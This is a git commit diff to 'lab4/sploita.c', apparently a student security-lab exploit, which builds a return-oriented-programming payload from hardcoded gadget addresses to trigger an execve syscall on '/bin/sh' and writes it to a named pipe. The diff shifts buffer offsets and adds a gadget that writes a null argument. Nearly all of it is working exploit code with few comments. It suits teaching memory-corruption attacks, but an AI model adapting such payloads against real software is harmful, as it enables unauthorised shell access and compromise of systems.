f422e98e60feaae413ad8758f3dd039727ef6b64
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-23 21:16:09 -0500

    Testing rest args, added write_at_ecx

--- lab4/sploita.c
+++ lab4/sploita.c
@@ -7,7 +7,7 @@
 
 int main(void)
 {
-  char bufr[184];
+  char bufr[200];
   // bufr address = bfbf57e5
   char null_arg_addr[] = "\x94\x58\xbf\xbf";
   char shell_addr[] = "\x98\x58\xbf\xbf";
@@ -20,6 +20,7 @@ int main(void)
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
   char pop_ecx[] = "\x22\xa4\xba\xbb";
   char add_dl_al[] = "\x07\x46\xbb\xbb";
+  char write_at_ecx_from_edx[] = "\x7e\xb8\x6b\xbb"; 
 
   char exec_arg[] = "\x3b\x01\x01\x01";
 
@@ -30,27 +31,31 @@ int main(void)
 
   // overwrite ebp
   // pop arg into edx
-  strcpy(bufr + 131, pop_edx);
+  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 135, exec_arg);
   // clear eax
-  strcpy(bufr + 139, xor_eax);  
+  strcpy(bufr + 139, xor_eax); 
   // add last 8 bits of edx to eax
-  strcpy(bufr + 143, add_dl_al);// eax now holds 0x3b (59)
+  strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
+                                 // eax now holds 0x3b (59)
   // clear edx 
-  strcpy(bufr + 147, xor_edx);  
+  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
   // pop null args address into ecx
-  strcpy(bufr + 151, pop_ecx);
-  strcpy(bufr + 155, null_arg_addr);
+  strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
+  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf5894
+  // write 4 bytes of null to address in ecx
+  strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
+                                             // null arg should be present
   // trap into kernel
-  strcpy(bufr + 159, trap);
+  strcpy(bufr + 163, trap);
   // leave 4 bytes for the ret call of trap
   // address of "/bin/sh"
-  strcpy(bufr + 167, shell_addr);
+  strcpy(bufr + 171, shell_addr);
   // address of prev arg
-  strcpy(bufr + 171, prev_addr);
-  // leave 4 bytes for null arg at bufr + 175
-  // location of "/bin/sh" bufr + 179
-  strcpy(bufr + 179, "/bin/sh");
+  strcpy(bufr + 175, prev_addr);
+  // leave 4 bytes for null arg at bufr + 179
+  // location of "/bin/sh" bufr + 183
+  strcpy(bufr + 183, "/bin/sh");
 
   writecmd(PIPEPATH, bufr);
   
